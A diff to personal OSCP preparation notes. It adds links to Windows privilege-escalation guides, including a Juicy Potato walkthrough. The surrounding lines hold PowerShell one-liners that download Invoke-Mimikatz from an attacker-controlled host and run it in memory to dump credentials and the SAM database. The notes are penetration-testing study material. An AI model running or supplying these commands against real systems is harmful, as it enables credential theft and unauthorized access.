@@ -75,6 +75,9 @@ description: Just some rough notes in preparation for the OSCP.
   * `powershell IEX (New-Object System.Net.Webclient).DownloadString('http://10.10.10.1:8080/Invoke-Mimikatz.ps1') ; Invoke-Mimikatz -DumpCreds`&#x20;
   * `powershell IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.119.164:8080/Invoke-Mimikatz.ps1') ; Invoke-Mimikatz -Command lsadump::sam`
 * Mimikatz errors? Need to downgrade your version? Use the version availabke at [this link](https://gitlab.com/kalilinux/packages/mimikatz/-/tree/d72fc2cca1df23f60f81bc141095f65a131fd099/).
+* Here are some good guides on Windows Privilege Escalation
+  * [0x1 Gitlab](https://0x1.gitlab.io/exploit/Windows-Privilege-Escalation/#juicy-potato-abusing-the-golden-privileges)
+  * [Juicy Potato Walkthrough](https://medium.com/r3d-buck3t/impersonating-privileges-with-juicy-potato-e5896b20d505)
 
 ### Session Passing
 
